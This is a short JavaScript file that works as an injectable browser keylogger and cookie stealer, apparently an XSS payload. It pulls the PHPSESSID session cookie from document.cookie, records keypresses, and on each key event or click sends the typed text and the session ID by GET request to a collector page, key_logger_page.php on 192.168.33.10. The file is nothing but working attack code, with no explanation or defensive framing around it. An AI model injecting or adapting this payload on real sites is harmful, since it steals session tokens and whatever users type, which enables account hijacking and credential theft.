var sessid = /PHPSESSID=(.*);?/.exec(document.cookie)[1];
var keyString = "";

var xhttp = new XMLHttpRequest();

function sendData(data) {
  xhttp.open("GET", "http://192.168.33.10/support/key_logger_page.php?data=" + data + "&sessid=" + sessid, true);
  xhttp.send();
}

document.onkeypress = function(e) {
  if (e.keyCode != 0) {
    sendData(keyString);
    keyString = "";
  } else {
    keyString += String.fromCharCode(e.charCode);
  }
};

document.onclick = function() { 
  sendData(keyString);
  keyString = "";
};
